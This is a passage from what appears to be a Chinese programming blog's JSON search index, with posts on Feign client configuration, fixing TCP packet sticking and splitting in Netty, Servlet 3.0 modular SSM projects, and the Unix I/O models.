(body == <span class=\"literal\">null</span>) <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (type == String.class) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Util.toString(body.asReader());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.decode(response, type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>集成进入spring，添加bean如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BeanConfigure</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> AuthCall <span class=\"title function_\">authCall</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Feign.builder()</span><br><span class=\"line\">                .client(<span class=\"keyword\">new</span> <span class=\"title class_\">ApacheHttpClient</span>())</span><br><span class=\"line\">                <span class=\"comment\">//设置为上述自定义的类</span></span><br><span class=\"line\">                .encoder(<span class=\"keyword\">new</span> <span class=\"title class_\">FNDataRawEncode</span>())</span><br><span class=\"line\">                .decoder(<span class=\"keyword\">new</span> <span class=\"title class_\">FNDataRawDecoder</span>())</span><br><span class=\"line\">                <span class=\"comment\">//设置输出日志</span></span><br><span class=\"line\">                .logger(<span class=\"keyword\">new</span> <span class=\"title class_\">Slf4jLogger</span>(AuthCall.class))</span><br><span class=\"line\">                <span class=\"comment\">//设置日志等级</span></span><br><span class=\"line\">                .logLevel(Logger.Level.FULL)</span><br><span class=\"line\">                .target(AuthCall.class, <span class=\"string\">&quot;http://queyr.beta.fn&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>之后启动项目，注入AuthCall对象后即可使用该接口。</p>\n","categories":["feign"],"tags":["feign"]},{"title":"Netty TCP粘包 拆包","url":"/2018/02/26/Netty-TCP%E7%B2%98%E5%8C%85-%E6%8B%86%E5%8C%85/","content":"<p>在平常使用tcp连接时，可能会出现tcp粘包的现象。<br>在客户端与服务端建立连接后，客户端提交数据后，如果发送的数据较大，该数据包会被拆分为几个小的包进行发送，如果数据比较小，可能会等待一会，把后续的多个小包封装成一个大点的包一起发送。服务端获取客户端的数据可能出现如下情况：<br>服务端发送A、B两个包</p>\n<blockquote>\n<ul>\n<li>A、B分开发送，服务端正常分两次收到两个包</li>\n<li>A、B被一起发送、服务端一次收到两个包AB</li>\n<li>A被拆分为A1、A2、可能出现服务端收到A1、A2B（或者B被拆开，B拆开的包和A粘在一起，或者AB都被拆开组合）</li>\n</ul>\n</blockquote>\n<p>除了第一种是正常的，后面两种都会出现问题。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Netty使用\"><a href=\"#Netty使用\" class=\"headerlink\" title=\"Netty使用\"></a>Netty使用</h3><p>maven项目：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pom.xml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.netty<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>netty-all<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.0.23.Final<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">TimeServer</span>().bind(<span class=\"number\">9999</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">bind</span><span class=\"params\">(<span class=\"type\">int</span> port)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//用于接受客户端连接</span></span><br><span class=\"line\">        <span class=\"type\">NioEventLoopGroup</span> <span class=\"variable\">bossGroup</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NioEventLoopGroup</span>();</span><br><span class=\"line\">        <span class=\"comment\">//用于网络读写</span></span><br><span class=\"line\">        <span class=\"type\">NioEventLoopGroup</span> <span class=\"variable\">workerGroup</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NioEventLoopGroup</span>();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ServerBootstrap</span> <span class=\"variable\">bootstrap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerBootstrap</span>();</span><br><span class=\"line\">            bootstrap.group(bossGroup, workerGroup)</span><br><span class=\"line\">                    .channel(NioServerSocketChannel.class)</span><br><span class=\"line\">                    .option(ChannelOption.SO_BACKLOG, <span class=\"number\">1024</span>)</span><br><span class=\"line\">                    .childHandler(<span class=\"keyword\">new</span> <span class=\"title class_\">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class=\"line\">                        <span class=\"meta\">@Override</span></span><br><span class=\"line\">                        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">initChannel</span><span class=\"params\">(SocketChannel ch)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">                            ch.pipeline().addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeServerHandler</span>());</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">            <span class=\"type\">ChannelFuture</span> <span class=\"variable\">channelFuture</span> <span class=\"operator\">=</span> bootstrap.bind(port).sync();</span><br><span class=\"line\">            channelFuture.channel().closeFuture().sync();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            bossGroup.shutdownGracefully();</span><br><span class=\"line\">            workerGroup.shutdownGracefully();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServerHandler</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> count;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">channelRead</span><span class=\"params\">(ChannelHandlerContext ctx, Object msg)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ByteBuf</span> <span class=\"variable\">buf</span> <span class=\"operator\">=</span> (ByteBuf) msg;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] req = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[buf.readableBytes()];</span><br><span class=\"line\">        buf.readBytes(req);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(req, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;The time server receive other: %s ,count is %d\\n&quot;</span>, request, ++count);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;QUERY TIME&quot;</span>.equalsIgnoreCase(request) ? format.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) : <span class=\"string\">&quot;ERROR&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">ByteBuf</span> <span class=\"variable\">resp</span> <span class=\"operator\">=</span> Unpooled.copiedBuffer(currentTime.getBytes());</span><br><span class=\"line\">        <span class=\"comment\">//写消息给客户端</span></span><br><span class=\"line\">        ctx.write(resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//channel读取完毕后</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">channelReadComplete</span><span class=\"params\">(ChannelHandlerContext ctx)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//将消息发送队列中的消息写入socketChannel中</span></span><br><span class=\"line\">        <span class=\"comment\">//为了频繁唤醒Selector进行消息发送，write后&quot;，并不直接将消息写入socketChannel</span></span><br><span class=\"line\">        ctx.flush();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exceptionCaught</span><span class=\"params\">(ChannelHandlerContext ctx, Throwable cause)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        ctx.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">TimeClient</span>().connect(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">9999</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">connect</span><span class=\"params\">(String host, <span class=\"type\">int</span> port)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"type\">EventLoopGroup</span> <span class=\"variable\">group</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NioEventLoopGroup</span>();</span><br><span class=\"line\">        <span class=\"type\">Bootstrap</span> <span class=\"variable\">bootstrap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Bootstrap</span>();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            bootstrap.group(group).channel(NioSocketChannel.class)</span><br><span class=\"line\">                    .option(ChannelOption.TCP_NODELAY, <span class=\"literal\">true</span>)</span><br><span class=\"line\">                    .handler(<span class=\"keyword\">new</span> <span class=\"title class_\">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class=\"line\">                        <span class=\"meta\">@Override</span></span><br><span class=\"line\">                        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">initChannel</span><span class=\"params\">(SocketChannel ch)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">                            ch.pipeline().addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeClientHandler</span>());</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">            <span class=\"type\">ChannelFuture</span> <span class=\"variable\">channelFuture</span> <span class=\"operator\">=</span> bootstrap.connect(host, port).sync();</span><br><span class=\"line\">            channelFuture.channel().closeFuture().sync();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            group.shutdownGracefully();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClientHandler</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ChannelInboundHandlerAdapter</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ByteBuf firstMessage;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TimeClientHandler</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] req = <span class=\"string\">&quot;QUERY TIME&quot;</span>.getBytes();</span><br><span class=\"line\">        firstMessage = Unpooled.buffer(req.length);</span><br><span class=\"line\">        firstMessage.writeBytes(req);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//客户端和服务端建立连接成功后调用</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">channelActive</span><span class=\"params\">(ChannelHandlerContext ctx)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        ctx.writeAndFlush(firstMessage);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> count;</span><br><span class=\"line\">    <span class=\"comment\">//服务端返回时调用</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">channelRead</span><span class=\"params\">(ChannelHandlerContext ctx, Object msg)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ByteBuf</span> <span class=\"variable\">buf</span> <span class=\"operator\">=</span> (ByteBuf) msg;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] req = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[buf.readableBytes()];</span><br><span class=\"line\">        buf.readBytes(req);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(req, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Now is %s count is %d\\n&quot;</span>, body, ++count);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exceptionCaught</span><span class=\"params\">(ChannelHandlerContext ctx, Throwable cause)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        ctx.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正常启动Server后启动Client，不会出现问题。</p>\n<h4 id=\"修改Client出现粘包\"><a href=\"#修改Client出现粘包\" class=\"headerlink\" title=\"修改Client出现粘包\"></a>修改Client出现粘包</h4><p>修改TimeClientHandler.channelActive</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ByteBuf message;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"type\">byte</span>[] req = <span class=\"string\">&quot;QUERY TIME&quot;</span>.getBytes();</span><br><span class=\"line\">    message = Unpooled.buffer(req.length);</span><br><span class=\"line\">    message.writeBytes(req);</span><br><span class=\"line\">    ctx.writeAndFlush(message);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重新启动客户端，会发现服务端打印的数据有问题，客户端打印的返回值也有问题。这样一位部分数据被粘在一起了，服务端返回给客户端同理。</p>\n<p>一位对于小包而言，在发送数据的时候，可能会等待后续包一起发送，有个等待时间，如果客户端发送数据后设置等待时间会出现什么情况，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 修改TimeClientHandler.channelActive</span></span><br><span class=\"line\">ByteBuf message;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"type\">byte</span>[] req = <span class=\"string\">&quot;QUERY TIME&quot;</span>.getBytes();</span><br><span class=\"line\">    message = Unpooled.buffer(req.length);</span><br><span class=\"line\">    message.writeBytes(req);</span><br><span class=\"line\">    ctx.writeAndFlush(message);</span><br><span class=\"line\">    TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重新启动客户端，发现服务端获取的数据正常了，但是出现了客户端收到的服务端返回的数据时异常的，因为我们在Server代码中设置了ChannelOption.SO_BACKLOG为1024，可以打印客户端第一次获取的返回数据长度，刚刚好是1024。</p>\n<h4 id=\"解决出现粘包的情况\"><a href=\"#解决出现粘包的情况\" class=\"headerlink\" title=\"解决出现粘包的情况\"></a>解决出现粘包的情况</h4><p>如果不使用netty的粘包解决办法需要自己手动设置ltv(length, type, value)，在发送消息时，在包的头部加入包长度，包类型，后面才是具体的数据。这样在获取tcp包时通过包头部去获取后续包的内容。或者在不同的消息间加入特殊分隔符（入http使用的是&#x2F;r&#x2F;n&#x2F;r&#x2F;n）</p>\n<p>通过LineBasedFrameDecoder解决<br>修改TimeServer.bind中bootstrap.childHandler中匿名内部类代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">initChannel</span><span class=\"params\">(SocketChannel ch)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">  <span class=\"comment\">//添加LineBasedFrameDecoder、StringDecoder、StringEncoder</span></span><br><span class=\"line\">    ch.pipeline().addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">LineBasedFrameDecoder</span>(<span class=\"number\">1024</span>))</span><br><span class=\"line\">            .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">StringDecoder</span>())</span><br><span class=\"line\">            .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">StringEncoder</span>())</span><br><span class=\"line\">            .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeServerHandler</span>());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改TimeServerHandler.channelRead：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class=\"line\">System.out.printf(<span class=\"string\">&quot;The time server receive other: %s ,count is %d\\n&quot;</span>, msg, ++count);</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;QUERY TIME&quot;</span>.equalsIgnoreCase((String)msg) ? format.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) : <span class=\"string\">&quot;ERROR&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//写消息给客户端，自己发送String，在后面添加分隔符</span></span><br><span class=\"line\">ctx.write(currentTime + System.getProperty(<span class=\"string\">&quot;line.separator&quot;</span>));</span><br></pre></td></tr></table></figure>\n<p>修改TimeClient.connect中bootstrap.childHandler中匿名内部类代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ch.pipeline().addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">LineBasedFrameDecoder</span>(<span class=\"number\">1024</span>))</span><br><span class=\"line\">        .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">StringDecoder</span>())</span><br><span class=\"line\">        .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">StringEncoder</span>())</span><br><span class=\"line\">        .addLast(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeClientHandler</span>());</span><br></pre></td></tr></table></figure>\n<p>修改TimeClientHandler.channelActive：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//直接发送String+分隔符</span></span><br><span class=\"line\">    ctx.writeAndFlush(<span class=\"string\">&quot;QUERY TIME&quot;</span> + System.getProperty(<span class=\"string\">&quot;line.separator&quot;</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改TimeClientHandler.channelRead：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">直接输出</span><br><span class=\"line\">System.out.printf(<span class=\"string\">&quot;Now is %s count is %d\\n&quot;</span>, msg, ++count);</span><br></pre></td></tr></table></figure>\n<p>启动服务端、客户端，访问正常。</p>\n<ul>\n<li>这里需要注意的我们设置的LineBasedFrameDecoder接受的长度是1024，如果超过这个长度会报错。</li>\n</ul>\n<p>这里通过LineBasedFrameDecoder、StringDecoder、StringEncoder组合就是按行来做粘包拆包处理，在发送的字符串末尾添加换行符。</p>\n<p>除了使用LineBasedFrameDecoder解决之前的问题，在Netty中还提供了两种方案：<br>1、DelimiterBasedFrameDecoder：自动完成以分隔符作为码流结束标识的消息解码。<br>2、FixedLengthFrameDecoder：固定长度解码器，按照指定长度对消息进行自动解码。</p>\n<p>对于DelimiterBasedFrameDecoder而言如果在设定的长度下还没有获取到分隔符一样会抛出异常，避免因为异常码流导致缺失分隔符。<br>对于FixedLengthFrameDecoder而言，如果是半包消息，FixedLengthFrameDecoder会缓存半包消息并等待下一个包到达后进行拼包，直到读取到一个完整的包。</p>\n<ul>\n<li>参考：《Netty权威指南》</li>\n</ul>\n","categories":["netty"],"tags":["netty","tcp","粘包","拆包"]},{"title":"SSM结合Servelt 3.0 模块化开发","url":"/2018/03/01/SSM%E7%BB%93%E5%90%88Servelt-3-0-%E6%A8%A1%E5%9D%97%E5%8C%96%E5%BC%80%E5%8F%91/","content":"<p>现在微服务非常火，但是一个大项目拆分为多个小项目，项目部署时，需要的服务器资源会比较多，而且对于前期小公司而已成相对较高。</p>\n<p>在Servelt3.0中新增了模块化开发，可以把web项目进行拆分，不同的项目不同的业绩，如果后期比较有钱人手足够后，对不同的项目拆分到不同的人负责，拆分出的项目可以单独启动而不影响，减少后期项目拆分重构的时间精力。</p>\n<p>基本思路：<br>1、其中一个项目作为主项目，把其中部分功能拆分到其他项目中<br>2、拆分出的项目，有自己的页面、逻辑<br>3、拆分出一个公共项目提供接口以及公共类方便不同项目中相互调用（无业务、只提供接口、通过包标注不同拆分业务）<br>4、拆分出的项目实现本项目中需要对外提供数据的接口</p>\n<span id=\"more\"></span>\n<h3 id=\"业务拆分\"><a href=\"#业务拆分\" class=\"headerlink\" title=\"业务拆分\"></a>业务拆分</h3><p>最开始所有业务都在一个项目里面，最多只是通过package进行了业务区分。</p>\n<p>现在对启动对业务进行拆分：<br>1、创建一个common项目，用于写接口已经公共类，以及基本的依赖。如下：<br><img src=\"/images/old/20180301%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-01%E4%B8%8B%E5%8D%883.30.13.png\"></p>\n<p>2、抽取user业务，用于user相关逻辑，依赖common，同时实现common用user相关接口用于外部调用。如下：<br><img src=\"/images/old/20180301%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-01%E4%B8%8B%E5%8D%883.32.52.png\"></p>\n<p>重点部分是抽取出的user项目。使用了Servlet3.0中模块化开发。<br>需要在user项目中，resource&#x2F;META-INF新增web-fragment.xml。web-fragment.xml结构类似于web.xml，用于web的相关配置比如监听器、拦截器等<br>在user项目中，jsp、js等文件保持和普通的web项目一致，方便后期user项目单独启动，通过pom文件控制user项目中文件的打包，过滤一些公用的js、css等文件。</p>\n<p>对于模块化开发需要注意的是：<br>1、资源文件需要在打包后生成的jar中的META-INF下，如jsp、js、css等（通过pom.xml控制）<br>2、需要在META-INF下新增web-fragment.xml</p>\n<ul>\n<li>改拆分项目中是所有的公共js、css等每个项目中存一份，通过pom控制打包时过滤，其实可以把这些公用的文件放入common项目中，把common项目改造成模块化，但是这样的一个弊端是在写js时提示就会非常不友好。</li>\n</ul>\n<p>缺点：<br>1、项目中不允许出现相同的类名，就算package不同也不行。<br>2、公共静态资源太多，每个项目中都有（可以放入静态文件服务器）</p>\n<p>优点：<br>1、减少了项目的部署<br>2、通过接口拆分调用，后续单独部署时调用方，不需要修改</p>\n<p>后续单独启动：<br>现在调用其他业务是通过pom中依赖直接调用，如果后续依赖的项目单独部署，需要通过远程服务调用。在项目中是通过common中的接口调用，对于调用方不需要知道实现类，所以后续远程调用可以通过hession、dubbo等SOA框架生成远程调用类，只需要新增远程调用服务的配置文件即可。</p>\n<p>项目拆分后，因为目录是标准的web目录，所以直接修改pom文件中jar为war，或者集成springboot，新增配置文件后，直接启动部署，业务代码无需修改变动。</p>\n<p>项目地址：</p>\n","categories":["模块化"],"tags":["SSM","Servelt 3.0","模块化开发"]},{"title":"Java基础-IO模型","url":"/2018/01/30/Java%E5%9F%BA%E7%A1%80-IO%E6%A8%A1%E5%9E%8B/","content":"<p>Unix网络编程中对I&#x2F;O模型做了5种分类：阻塞I&#x2F;O模型、非阻塞I&#x2F;O模型、I&#x2F;O复用模型、信号驱动I&#x2F;O模型、异步I&#x2F;O模型。</p>\n<span id=\"more\"></span>\n<p><strong>阻塞I&#x2F;O模型</strong> ：在缺省模式下，所有文件存在都是阻塞的。在嵌套字中，在进程空间中调用recvfrom，其系统调用直到数据包到达被复制到应用进程的缓冲区中或者发生错误时才返回，在此期间会一直等待，进程从调用recvfrom开始到它返回的整段时间内都是被阻塞的。<br>图：<br><img src=\"/images/old/2018013011043-6296a0fe7e80353d.jpeg\"></p>\n<ul>\n<li>recvfrom：本函数用于从（已连接）套接口上接收数据，并捕获数据发送源的地址，成功则返回接收到的字符数，失败则返回-1，错误原因存于errno中。</li>\n</ul>\n<p><strong>非阻塞I&#x2F;O模型</strong> ：recvfrom从应用层到内核的时候，如果该缓冲区没有数据的话，就直接返回一个EWOULDBLOCK错误，一般都是对非阻塞I&#x2F;O模型进行轮询检查这个状态，看内核是不是有数据到来。<br>图：<br><img src=\"/images/old/2018013011043-393ab84aab39a91c.png\"></p>\n<p><strong>I&#x2F;O复用模型</strong> ：Liunx提供select&#x2F;poll，进程通过将一个或多个fd传输给select或者poll系统调用，阻塞在select操作上，这样select&#x2F;poll可以侦测多个fd是否处于就绪状态。select&#x2F;pool是顺序扫描fd是否就绪，而且支持的fd数量有限，所以受到一些制约。Linux还提供epoll系统调用，epoll使用基于事件驱动方式代替顺序扫描，性能更高，当有fd就绪的时候，立即回调rollback。<br><img src=\"/images/old/2018013011043-30acb370892f468d.png\"></p>\n<p><strong>信号驱动I&#x2F;O模型</strong> ：先开启嵌套口信号驱动I&#x2F;O功能，并通过系统调用sigaction执行一个信号处理函数（此系统立即返回，进程继续工作，非阻塞）。当数据准备就绪的时候，非该进程生成一个SIGIO信号，通过信号回调通知应用程序调用recvfrom来读取数据，并通知主循环函数处理数据。<br><img src=\"/images/old/20180130dc9df87303a2aee6e741b48b78b4b8d9.jpeg\"></p>\n<p><strong>异步I&#x2F;O</strong> ：告知内核启动某个操作，让内核在整个操作完成后（包括将数据从内核复制到用户自己的缓冲区）通知我们。<br><img src=\"/images/old/2018013011043-751d8b96d391cd43.png\"></p>\n<ul>\n<li>异步I&#x2F;O模型和信号驱动I&#x2F;O模型区别在于，信号驱动模型由内核通知何时可以开始I&#x2F;O操作；异步I&#x2F;O模型由内核通知I&#x2F;O何时已经完成。</li>\n</ul>\n<h3 id=\"JavaI-O\"><a href=\"#JavaI-O\" class=\"headerlink\" 